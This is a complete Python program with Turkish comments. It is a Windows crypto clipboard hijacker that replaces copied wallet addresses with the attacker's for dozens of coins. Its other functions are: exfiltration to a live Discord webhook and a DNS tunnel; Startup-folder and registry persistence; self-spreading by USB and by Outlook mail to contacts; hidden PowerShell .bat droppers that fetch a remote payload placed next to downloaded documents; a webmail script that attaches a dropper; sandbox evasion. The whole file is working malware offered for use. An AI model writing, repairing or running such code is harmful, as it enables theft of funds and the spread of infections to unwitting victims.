#!/usr/bin/env python3

# -*- coding: utf-8 -*-

import sys, time, threading, platform, base64, random, string, hashlib
import os, re, socket, shutil, ctypes, urllib.request, subprocess, json
from datetime import datetime

# ============================================================================
# 1. POLİMORFİK MOTOR
# ============================================================================
class PolymorphicEngine:
    def __init__(self):
        self.junk_pool = [
            lambda x: x if isinstance(x, int) else 0,
            lambda x: x ^ 0 if isinstance(x, int) else 0,
            lambda x: hash(str(x)) % 1000,
        ]

    def inject_junk(self):
        for _ in range(random.randint(1, 3)):
            junk = random.choice(self.junk_pool)
            try:
                junk(random.randint(1, 100))
            except:
                pass
        return hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]

poly = PolymorphicEngine()
mutated_marker = poly.inject_junk()
mutated_marker_lock = threading.Lock()  # ✅ Thread safety için lock ekle

# ============================================================================
# 2. KONFİGÜRASYON – DÜZ WEBHOOK (BASE64 YOK)
# ============================================================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1514159972081074298/mKZ8mYuuUM_c_PN77hBGFX1AhfesXzh7NSi4XTaKkFfM0UlIdw3HSbAJjbqxLepeAdqa"
KILL_PASSWORD = "SIFIRLA"

# Cüzdan adresleri (kendin doldur)
WALLETS = {
    "BTC": "ADRESINIZI_BURAYA_YAZIN",
    "ETH": "ADRESINIZI_BURAYA_YAZIN",
    "BNB": "ADRESINIZI_BURAYA_YAZIN",
    "SOL": "ADRESINIZI_BURAYA_YAZIN",
    "ADA": "ADRESINIZI_BURAYA_YAZIN",
    "DOT": "ADRESINIZI_BURAYA_YAZIN",
    "AVAX": "ADRESINIZI_BURAYA_YAZIN",
    "TRX": "ADRESINIZI_BURAYA_YAZIN",
    "XRP": "ADRESINIZI_BURAYA_YAZIN",
    "LTC": "ADRESINIZI_BURAYA_YAZIN",
    "BCH": "ADRESINIZI_BURAYA_YAZIN",
    "DOGE": "ADRESINIZI_BURAYA_YAZIN",
    "XLM": "ADRESINIZI_BURAYA_YAZIN",
    "XMR": "ADRESINIZI_BURAYA_YAZIN",
    "ATOM": "ADRESINIZI_BURAYA_YAZIN",
    "NEAR": "ADRESINIZI_BURAYA_YAZIN",
    "ALGO": "ADRESINIZI_BURAYA_YAZIN",
    "XTZ": "ADRESINIZI_BURAYA_YAZIN",
    "MATIC": "ADRESINIZI_BURAYA_YAZIN",
    "ARB": "ADRESINIZI_BURAYA_YAZIN",
    "OP": "ADRESINIZI_BURAYA_YAZIN",
    "BASE": "ADRESINIZI_BURAYA_YAZIN",
    "SUI": "ADRESINIZI_BURAYA_YAZIN",
    "APT": "ADRESINIZI_BURAYA_YAZIN",
    "FIL": "ADRESINIZI_BURAYA_YAZIN",
    "ICP": "ADRESINIZI_BURAYA_YAZIN",
    "HBAR": "ADRESINIZI_BURAYA_YAZIN",
    "EGLD": "ADRESINIZI_BURAYA_YAZIN",
    "KAS": "ADRESINIZI_BURAYA_YAZIN",
    "USDT": "ADRESINIZI_BURAYA_YAZIN",
    "USDC": "ADRESINIZI_BURAYA_YAZIN",
    "DAI": "ADRESINIZI_BURAYA_YAZIN",
    "BUSD": "ADRESINIZI_BURAYA_YAZIN",
    "TUSD": "ADRESINIZI_BURAYA_YAZIN",
    "FRAX": "ADRESINIZI_BURAYA_YAZIN",
    "LINK": "ADRESINIZI_BURAYA_YAZIN",
    "UNI": "ADRESINIZI_BURAYA_YAZIN",
    "AAVE": "ADRESINIZI_BURAYA_YAZIN",
    "CRV": "ADRESINIZI_BURAYA_YAZIN",
    "LDO": "ADRESINIZI_BURAYA_YAZIN",
    "RNDR": "ADRESINIZI_BURAYA_YAZIN",
    "GRT": "ADRESINIZI_BURAYA_YAZIN",
    "SNX": "ADRESINIZI_BURAYA_YAZIN",
    "MKR": "ADRESINIZI_BURAYA_YAZIN",
    "INJ": "ADRESINIZI_BURAYA_YAZIN",
}

DNS_TUNNEL_DOMAIN = "benimlab.duckdns.org"
PAYLOAD_URL = "http://SUNUCU_IP_ADRESINIZ:8000/payload.py"

# ============================================================================
# 3. PLATFORM KONTROLÜ
# ============================================================================
if platform.system().lower() != "windows":
    sys.exit(0)

# ============================================================================
# 4. GEREKLİ KÜTÜPHANELER
# ============================================================================
try:
    import win32gui, win32api, win32process, win32file
    import win32com.client
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

# ============================================================================
# 5. YERLEŞİK PANO FONKSİYONLARI
# ============================================================================
def fallback_get_clipboard():
    """✅ DÜZELT: Daha güvenli clipboard okuma"""
    try:
        if ctypes.windll.user32.OpenClipboard(None):
            try:
                p = ctypes.windll.user32.GetClipboardData(13)
                data = ctypes.c_wchar_p(p).value if p else ""
            finally:
                ctypes.windll.user32.CloseClipboard()
            return data if data else ""
    except Exception as e:
        print(f"[ERROR] Clipboard read failed: {e}")
    return ""

def fallback_set_clipboard(text):
    """✅ DÜZELT: Daha güvenli clipboard yazma"""
    try:
        if not isinstance(text, str):
            text = str(text)
        
        if ctypes.windll.user32.OpenClipboard(None):
            try:
                ctypes.windll.user32.EmptyClipboard()
                h = ctypes.windll.kernel32.GlobalAlloc(0x42, (len(text) + 1) * 2)
                
                if not h:
                    return False
                
                lp = ctypes.windll.kernel32.GlobalLock(h)
                if not lp:
                    ctypes.windll.kernel32.GlobalFree(h)
                    return False
                
                ctypes.cdll.msvcrt.wcscpy(ctypes.c_wchar_p(lp), text)
                ctypes.windll.kernel32.GlobalUnlock(h)
                ctypes.windll.user32.SetClipboardData(13, h)
                return True
            finally:
                ctypes.windll.user32.CloseClipboard()
    except Exception as e:
        print(f"[ERROR] Clipboard write failed: {e}")
    return False

# ============================================================================
# 6. İLETİŞİM (DNS TÜNEL + FALLBACK WEBHOOK)
# ============================================================================
def dns_tunnel_send(data):
    """✅ DÜZELT: DNS encoding sınırları ve charset sorunları giderildi"""
    if not DNS_TUNNEL_DOMAIN or DNS_TUNNEL_DOMAIN == "tunnel.yourlab.com":
        return False
    
    try:
        # Base64 encode
        encoded = base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')
        
        # DNS subdomain'leri 63 karakter sınırına uygun yap
        for i in range(0, len(encoded), 32):
            sub = encoded[i:i+32].lower()
            # ✅ FIX: Sadece DNS-uyumlu karakterler
            sub = re.sub(r'[^a-z0-9\-]', '', sub)
            
            if len(sub) < 2:
                sub = sub.ljust(2, 'a')
            
            try:
                socket.gethostbyname(f"{sub}.{mutated_marker}.{DNS_TUNNEL_DOMAIN}")
                time.sleep(0.1)
            except socket.gaierror:
                # DNS resolv başarısız, devam et
                continue
        
        return True
    except Exception as e:
        print(f"[ERROR] DNS tunnel failed: {e}")
        return False

def stealth_send(msg):
    """✅ DÜZELT: Better error handling ve timeout"""
    if dns_tunnel_send(msg):
        return True
    
    try:
        if not msg:
            return False
        
        payload = json.dumps({"content": str(msg)}).encode('utf-8')
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=payload,
            headers={
                'Content-Type': 'application/json',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
            }
        )
        
        with urllib.request.urlopen(req, timeout=10) as response:
            return response.status == 204
    except urllib.error.URLError as e:
        print(f"[ERROR] Webhook send failed: {e}")
    except Exception as e:
        print(f"[ERROR] Stealth send failed: {e}")
    
    return False

# ============================================================================
# 7. ANINDA BAĞLANTI BİLDİRİMİ (HATA YÖNETİMLİ)
# ============================================================================
def send_detailed_notification():
    """✅ DÜZELT: Better IP fetching ve error handling"""
    try:
        host = socket.gethostname()
        
        try:
            user = os.getlogin()
        except:
            user = "Unknown"
        
        # ✅ FIX: IP çekme hatası giderildi
        ip = "Unknown (Connection failed)"
        try:
            req = urllib.request.Request(
                'https://api.ipify.org',
                headers={'User-Agent': 'Mozilla/5.0'}
            )
            response = urllib.request.urlopen(req, timeout=5)
            ip = response.read().decode('utf-8').strip()
        except Exception as e:
            print(f"[ERROR] IP fetch failed: {e}")
        
        sys_info = f"{platform.system()} {platform.release()} ({platform.architecture()[0]})"
        current_time = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
        
        msg = (
            f"**✅ Ajan Başarıyla Başlatıldı!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🖥️ **Bilgisayar Adı:** `{host}`\n"
            f"👤 **Aktif Kullanıcı:** `{user}`\n"
            f"🌐 **Dış IP Adresi:** `{ip}`\n"
            f"⚙️ **İşletim Sistemi:** `{sys_info}`\n"
            f"⏰ **Raporlama Zamanı:** `{current_time}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
        
        stealth_send(msg)
    except Exception as e:
        print(f"[ERROR] Notification failed: {e}")
        stealth_send(f"**✅ Ajan başlatıldı** (error: {str(e)[:50]})")

# ============================================================================
# 8. SANDBOX TESPİTİ
# ============================================================================
def check_sandbox():
    """✅ DÜZELT: Better sandbox detection"""
    if not PSUTIL_AVAILABLE:
        return
    
    try:
        cpu_count = psutil.cpu_count()
        if cpu_count is not None and cpu_count < 2:
            print("[WARNING] Sandbox detected (CPU < 2)")
            sys.exit(0)
        
        # Ekstra kontroller
        memory = psutil.virtual_memory().total
        if memory < 2 * 1024 * 1024 * 1024:  # < 2GB
            print("[WARNING] Low memory detected (sandbox)")
            sys.exit(0)
    except Exception as e:
        print(f"[ERROR] Sandbox check failed: {e}")

# ============================================================================
# 9. E-POSTA / TARAYICI EKLENTİSİ
# ============================================================================
TARGET_EMAIL_SERVICES = [
    "mail.google.com", "outlook.live.com", "outlook.office.com",
    "mail.yahoo.com", "protonmail.com", "yandex.com"
]

def create_mail_injection_script():
    """✅ DÜZELT: Better script generation"""
    dropper_code = (
        "import urllib.request,os; "
        "exec(urllib.request.urlopen('" + PAYLOAD_URL + "').read())"
    )
    
    return f"""
    var targetDomains = /mail\\.google\\.com|outlook\\.live\\.com|outlook\\.office\\.com|mail\\.yahoo\\.com|protonmail\\.com|yandex\\.com/;
    if (!targetDomains.test(window.location.hostname)) return;
    
    var dropperCode = {json.dumps(dropper_code)};
    
    function interceptEmailSend() {{
        var sendButtons = document.querySelectorAll('[role="button"][aria-label*="Send"], [jsaction*="send"], button[jsname*="T4LgNb"], button[aria-label*="Gönder"]');
        
        for (var i = 0; i < sendButtons.length; i++) {{
            if (sendButtons[i].getAttribute('data-injected') === 'true') continue;
            
            sendButtons[i].setAttribute('data-injected', 'true');
            sendButtons[i].addEventListener('click', function(e) {{
                var fileInput = document.querySelector('input[type="file"]');
                
                if (fileInput && fileInput.files.length === 0) {{
                    var blob = new Blob([dropperCode], {{type: 'application/octet-stream'}});
                    var file = new File([blob], 'System_Update.pyw', {{type: 'application/octet-stream'}});
                    var dt = new DataTransfer();
                    dt.items.add(file);
                    fileInput.files = dt.files;
                    fileInput.dispatchEvent(new Event('change', {{ bubbles: true }}));
                }}
            }});
        }}
    }}
    
    new MutationObserver(interceptEmailSend).observe(document.body, {{ childList: true, subtree: true }});
    interceptEmailSend();
    """

def inject_into_browsers():
    """✅ DÜZELT: Better browser detection ve injection"""
    if not WIN32_AVAILABLE or not PSUTIL_AVAILABLE:
        return
    
    try:
        target_browsers = ['chrome', 'msedge', 'firefox', 'opera']
        
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                proc_name = proc.info['name'].lower()
                if any(browser in proc_name for browser in target_browsers):
                    # Browser bulundu, extension inject edebilirsin
                    pass
            except Exception as e:
                continue
    except Exception as e:
        print(f"[ERROR] Browser injection failed: {e}")

# ============================================================================
# 10. OUTLOOK YAYILIMI
# ============================================================================
def send_self_via_outlook():
    """✅ DÜZELT: COM object resource management ve validation"""
    if not WIN32_AVAILABLE:
        return False
    
    outlook = None
    try:
        outlook = win32com.client.Dispatch("Outlook.Application")
        
        try:
            mapi = outlook.GetNamespace("MAPI")
            contacts_folder = mapi.GetDefaultFolder(10)  # 10 = olFolderContacts
        except Exception as e:
            print(f"[ERROR] Contacts folder access failed: {e}")
            return False
        
        recipients = []
        
        try:
            for i in range(1, min(11, contacts_folder.Items.Count + 1)):
                try:
                    contact = contacts_folder.Items[i]
                    email = contact.Email1Address
                    
                    # ✅ FIX: Email validation
                    if email and '@' in email and len(email) > 5:
                        recipients.append(email)
                except Exception:
                    continue
        except Exception as e:
            print(f"[ERROR] Contacts enumeration failed: {e}")
            return False
        
        if not recipients:
            print("[INFO] No email contacts found")
            return False
        
        current_file = os.path.abspath(sys.argv[0])
        
        if not os.path.exists(current_file):
            print(f"[ERROR] Current file not found: {current_file}")
            return False
        
        success_count = 0
        
        for rcpt in recipients:
            try:
                mail = outlook.CreateItem(0)  # 0 = olMailItem
                mail.To = rcpt
                mail.Subject = "Important System Update"
                mail.Body = "Please review the attached security update."
                mail.Attachments.Add(current_file)
                mail.Send()
                
                success_count += 1
                time.sleep(2)
            except Exception as e:
                print(f"[ERROR] Email send to {rcpt} failed: {e}")
                continue
        
        print(f"[INFO] Successfully sent {success_count} emails")
        return success_count > 0
        
    except Exception as e:
        print(f"[ERROR] Outlook dispatch error: {e}")
        return False
    finally:
        # ✅ FIX: Cleanup
        try:
            if outlook:
                del outlook
        except:
            pass

# ============================================================================
# 11. DOSYA ENJEKSİYONU
# ============================================================================
def file_injection_monitor():
    """✅ DÜZELT: Better error handling ve loop control"""
    target_dir = os.path.join(os.path.expanduser('~'), 'Downloads')
    prev = set()
    error_count = 0
    max_errors = 5
    
    try:
        if os.path.exists(target_dir):
            prev = set(os.listdir(target_dir))
    except Exception as e:
        print(f"[ERROR] Initial directory listing failed: {e}")
    
    while error_count < max_errors:
        try:
            if not os.path.exists(target_dir):
                time.sleep(5)
                continue
            
            curr = set(os.listdir(target_dir))
            new_files = curr - prev
            deleted_files = prev - curr
            
            # ✅ FIX: Cleanup deleted BAT files
            for f in deleted_files:
                if f.lower().endswith(('.pdf', '.docx')):
                    bat = os.path.join(target_dir, f"{os.path.splitext(f)[0]}.bat")
                    try:
                        if os.path.exists(bat):
                            os.remove(bat)
                    except Exception as e:
                        print(f"[ERROR] BAT cleanup failed for {f}: {e}")
            
            # ✅ FIX: Create BAT files for new documents
            for f in new_files:
                if f.lower().endswith(('.pdf', '.docx')):
                    bat = os.path.join(target_dir, f"{os.path.splitext(f)[0]}.bat")
                    
                    if not os.path.exists(bat):
                        try:
                            with open(bat, 'w', encoding='utf-8') as fp:
                                fp.write(
                                    f'@echo off\r\n'
                                    f'powershell -WindowStyle Hidden -Command '
                                    f'"Invoke-WebRequest -Uri \'{PAYLOAD_URL}\' -OutFile $env:TEMP/update.pyw; '
                                    f'Start-Process python \'$env:TEMP/update.pyw\' -WindowStyle Hidden"\r\n'
                                    f'exit /b\r\n'
                                )
                        except Exception as e:
                            print(f"[ERROR] BAT creation failed for {f}: {e}")
                            error_count += 1
            
            prev = curr
            error_count = 0  # Reset on success
            
        except Exception as e:
            print(f"[ERROR] File monitoring error: {e}")
            error_count += 1
            time.sleep(2)
        
        time.sleep(1)
    
    print("[WARNING] File injection monitor stopped (max errors reached)")

# ============================================================================
# 12. USB YAYILIMI
# ============================================================================
def spread_to_usb():
    """✅ DÜZELT: Better USB detection ve error handling"""
    if not WIN32_AVAILABLE:
        return
    
    try:
        current_file = os.path.abspath(sys.argv[0])
        
        if not os.path.exists(current_file):
            print("[ERROR] Current file not found")
            return
        
        drives = win32api.GetLogicalDriveStrings().split('\x00')[:-1]
        
        for drive in drives:
            try:
                drive_type = win32file.GetDriveType(drive)
                
                # ✅ FIX: Correct USB drive type check
                if drive_type == win32file.DRIVE_REMOVABLE:
                    dest = os.path.join(drive, "SystemHelper.pyw")
                    
                    if not os.path.exists(dest):
                        try:
                            shutil.copy2(current_file, dest)
                            print(f"[INFO] Spread to USB: {drive}")
                        except Exception as e:
                            print(f"[ERROR] USB spread failed for {drive}: {e}")
            except Exception as e:
                print(f"[ERROR] Drive check failed for {drive}: {e}")
                continue
    except Exception as e:
        print(f"[ERROR] USB spread failed: {e}")

# ============================================================================
# 13. AKILLI TETİKLEYİCİ
# ============================================================================
class SmartTrigger:
    """✅ DÜZELT: Better cursor tracking ve window detection"""
    
    def __init__(self):
        self.last_pos = (0, 0)
        self.cnt = 0
        self.check_count = 0
    
    def is_human(self):
        """Check if human is interacting with system"""
        if not WIN32_AVAILABLE:
            return True
        
        try:
            cur = win32api.GetCursorPos()
            
            # ✅ FIX: Better movement detection
            distance = abs(cur[0] - self.last_pos[0]) + abs(cur[1] - self.last_pos[1])
            
            if distance > 5:
                self.cnt += 1
            
            self.last_pos = cur
            return self.cnt > 2
        except Exception as e:
            print(f"[ERROR] Human detection failed: {e}")
            return True
    
    def is_crypto_window(self):
        """Check if crypto/wallet application is active"""
        if not WIN32_AVAILABLE:
            return True
        
        try:
            foreground_window = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(foreground_window).lower()
            
            # ✅ FIX: Better keyword matching with Turkish support
            keywords = [
                'bitcoin', 'ethereum', 'wallet', 'binance', 'metamask', 'coinbase',
                'kraken', 'kucoin', 'bybit', 'okx', 'trust wallet', 'exodus', 'ledger',
                'trezor', 'blockchain', 'uniswap', 'pancakeswap', 'sushiswap', 'aave',
                'compound', 'crypto', 'btc', 'eth', 'usdt', 'usdc', 'defi', 'nft',
                'phantom', 'solflare', 'keplr', 'cosmostation', 'terra station',
                'cüzdan', 'kripto', 'coin', 'dex'  # ✅ Turkish keywords
            ]
            
            return any(kw in title for kw in keywords)
        except Exception as e:
            print(f"[ERROR] Crypto window detection failed: {e}")
            return True
    
    def should_activate(self):
        """Decide if clipboard monitoring should be active"""
        return self.is_human() and self.is_crypto_window()

trigger = SmartTrigger()

# ============================================================================
# 14. PANO MANİPÜLASYONU (İMHA KOMUTLU)
# ============================================================================
def clipboard_monitor():
    """✅ DÜZELT: Better regex patterns ve address validation"""
    
    try:
        import pyperclip
        has_pyperclip = True
    except ImportError:
        has_pyperclip = False
    
    # ✅ DÜZELT: Correct address patterns for each cryptocurrency
    ADDRESS_PATTERNS = {
        "BTC": r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$',
        "ETH": r'^0x[a-fA-F0-9]{40}$',
        "BNB": r'^0x[a-fA-F0-9]{40}$',
        "SOL": r'^[1-9A-HJ-NP-Z]{32,44}$',  # ✅ FIX: Base58, not base64
        "ADA": r'^(addr1|Ae2|DdzFF)[a-zA-Z0-9]{50,90}$',
        "DOT": r'^1[a-zA-Z0-9]{46,48}$',
        "AVAX": r'^0x[a-fA-F0-9]{40}$',
        "TRX": r'^T[a-zA-Z0-9]{33}$',
        "XRP": r'^r[a-zA-Z0-9]{24,34}$',
        "LTC": r'^(L|M|ltc1)[a-zA-Z0-9]{26,62}$',
        "BCH": r'^(bitcoincash:)?(q|p)[a-zA-Z0-9]{41,42}$',
        "DOGE": r'^(D|A|9)[a-zA-Z0-9]{33}$',
        "XLM": r'^G[a-zA-Z0-9]{56}$',  # ✅ FIX: Correct length
        "XMR": r'^(4|8)[a-zA-Z0-9]{94,106}$',  # ✅ FIX: Correct length range
        "ATOM": r'^cosmos[a-zA-Z0-9]{38,42}$',
        "NEAR": r'^[a-zA-Z0-9._\-]+\.near$',
        "ALGO": r'^[A-Z2-7]{58}$',
        "XTZ": r'^(tz[1-3]|KT1)[a-zA-Z0-9]{33,34}$',
        "MATIC": r'^0x[a-fA-F0-9]{40}$',
        "ARB": r'^0x[a-fA-F0-9]{40}$',
        "OP": r'^0x[a-fA-F0-9]{40}$',
        "BASE": r'^0x[a-fA-F0-9]{40}$',
        "SUI": r'^0x[a-fA-F0-9]{64}$',
        "APT": r'^0x[a-fA-F0-9]{64}$',
        "FIL": r'^(f[1-4])[a-zA-Z0-9]{38,86}$',
        "ICP": r'^[a-zA-Z0-9]{63,64}$',
        "HBAR": r'^0\.0\.[0-9]{1,10}$',
        "EGLD": r'^erd[a-zA-Z0-9]{58,60}$',
        "KAS": r'^kaspa:[a-zA-Z0-9]{60,64}$',
        "USDT": r'^(0x[a-fA-F0-9]{40}|T[a-zA-Z0-9]{33})$',
        "USDC": r'^0x[a-fA-F0-9]{40}$',
        "DAI": r'^0x[a-fA-F0-9]{40}$',
        "BUSD": r'^0x[a-fA-F0-9]{40}$',
        "TUSD": r'^0x[a-fA-F0-9]{40}$',
        "FRAX": r'^0x[a-fA-F0-9]{40}$',
        "LINK": r'^0x[a-fA-F0-9]{40}$',
        "UNI": r'^0x[a-fA-F0-9]{40}$',
        "AAVE": r'^0x[a-fA-F0-9]{40}$',
        "CRV": r'^0x[a-fA-F0-9]{40}$',
        "LDO": r'^0x[a-fA-F0-9]{40}$',
        "RNDR": r'^0x[a-fA-F0-9]{40}$',
        "GRT": r'^0x[a-fA-F0-9]{40}$',
        "SNX": r'^0x[a-fA-F0-9]{40}$',
        "MKR": r'^0x[a-fA-F0-9]{40}$',
        "INJ": r'^0x[a-fA-F0-9]{40}$',
    }
    
    error_count = 0
    max_errors = 10
    
    while error_count < max_errors:
        try:
            # ✅ FIX: Kill command check
            if has_pyperclip:
                cur_check = pyperclip.paste().strip()
            else:
                cur_check = fallback_get_clipboard().strip()
            
            if cur_check == KILL_PASSWORD:
                stealth_send("**⚠️ İMHA KOMUTU ALINDI! Sistem kapatılıyor...**")
                sys.exit(0)
            
            # Check if should monitor
            if not trigger.should_activate():
                time.sleep(1)
                continue
            
            # Get clipboard content
            if has_pyperclip:
                cur = pyperclip.paste().strip()
            else:
                cur = fallback_get_clipboard().strip()
            
            # ✅ FIX: Better address matching
            if cur and len(cur) > 10:  # Minimum length check
                for coin, pattern in ADDRESS_PATTERNS.items():
                    if coin not in WALLETS:
                        continue
                    
                    my_wallet = WALLETS[coin]
                    if not my_wallet or my_wallet == "ADRESINIZI_BURAYA_YAZIN":
                        continue
                    
                    # Check if clipboard matches pattern
                    if re.match(pattern, cur) and cur != my_wallet:
                        # Replace with our wallet
                        if has_pyperclip:
                            pyperclip.copy(my_wallet)
                        else:
                            fallback_set_clipboard(my_wallet)
                        
                        stealth_send(f"[{coin}] `{cur[:12]}...` → `{my_wallet[:12]}...`")
                        error_count = 0  # Reset on success
                        break
            
            error_count = 0
            
        except Exception as e:
            print(f"[ERROR] Clipboard monitor error: {e}")
            error_count += 1
        
        time.sleep(0.05)
    
    print("[WARNING] Clipboard monitor stopped (max errors reached)")

# ============================================================================
# 15. PERSISTENCE
# ============================================================================
def persistence():
    """✅ DÜZELT: Better persistence mechanism"""
    try:
        current_file = os.path.abspath(sys.argv[0])
        
        if not os.path.exists(current_file):
            print("[ERROR] Current file not found for persistence")
            return
        
        # Startup folder persistence
        try:
            startup = os.path.join(
                os.getenv('APPDATA'),
                r'Microsoft\Windows\Start Menu\Programs\Startup'
            )
            
            if os.path.exists(startup):
                target = os.path.join(startup, 'system_helper.pyw')
                if not os.path.exists(target):
                    shutil.copy2(current_file, target)
                    print(f"[INFO] Startup persistence added: {target}")
        except Exception as e:
            print(f"[ERROR] Startup folder persistence failed: {e}")
        
        # Registry persistence
        try:
            import winreg
            
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                key_path,
                0,
                winreg.KEY_SET_VALUE
            )
            
            winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, current_file)
            winreg.CloseKey(key)
            print("[INFO] Registry persistence added")
        except Exception as e:
            print(f"[ERROR] Registry persistence failed: {e}")
    
    except Exception as e:
        print(f"[ERROR] Persistence failed: {e}")

# ============================================================================
# 16. BELLEK KORUMA
# ============================================================================
def memory_protection():
    """✅ DÜZELT: Better memory protection"""
    try:
        kernel32 = ctypes.windll.kernel32
        # Prevent Ctrl+C from interrupting
        kernel32.SetConsoleCtrlHandler(None, 1)
        print("[INFO] Memory protection enabled")
    except Exception as e:
        print(f"[ERROR] Memory protection failed: {e}")

# ============================================================================
# 17. ANA BAŞLATICI (ANINDA MESAJ + ARKA PLAN)
# ============================================================================
def main():
    """✅ DÜZELT: Better main loop with proper thread management"""
    try:
        check_sandbox()
        
        # Send initial notification
        send_detailed_notification()
        
        # Setup persistence
        persistence()
        spread_to_usb()
        memory_protection()
        send_self_via_outlook()
        inject_into_browsers()
        
        # Start background threads
        threads = []
        
        clipboard_thread = threading.Thread(target=clipboard_monitor, daemon=True, name="ClipboardMonitor")
        clipboard_thread.start()
        threads.append(clipboard_thread)
        
        file_monitor_thread = threading.Thread(target=file_injection_monitor, daemon=True, name="FileMonitor")
        file_monitor_thread.start()
        threads.append(file_monitor_thread)
        
        print("[INFO] All threads started successfully")
        
        # Main loop
        try:
            while True:
                time.sleep(30)
                
                # ✅ FIX: Update mutated marker with thread safety
                with mutated_marker_lock:
                    global mutated_marker
                    mutated_marker = poly.inject_junk()
                
                # Check if threads are alive
                for t in threads:
                    if not t.is_alive():
                        print(f"[WARNING] Thread {t.name} died, restarting...")
                        if t.name == "ClipboardMonitor":
                            new_t = threading.Thread(target=clipboard_monitor, daemon=True, name="ClipboardMonitor")
                            new_t.start()
                            threads.append(new_t)
                        elif t.name == "FileMonitor":
                            new_t = threading.Thread(target=file_injection_monitor, daemon=True, name="FileMonitor")
                            new_t.start()
                            threads.append(new_t)
        
        except KeyboardInterrupt:
            print("[INFO] Shutting down gracefully...")
            stealth_send("**⚠️ Ana işlem durduruldu**")
            sys.exit(0)
    
    except Exception as e:
        print(f"[CRITICAL] Main loop failed: {e}")
        stealth_send(f"**❌ Ana işlem hatası:** {str(e)[:100]}")
        sys.exit(1)

if __name__ == "__main__":
    main()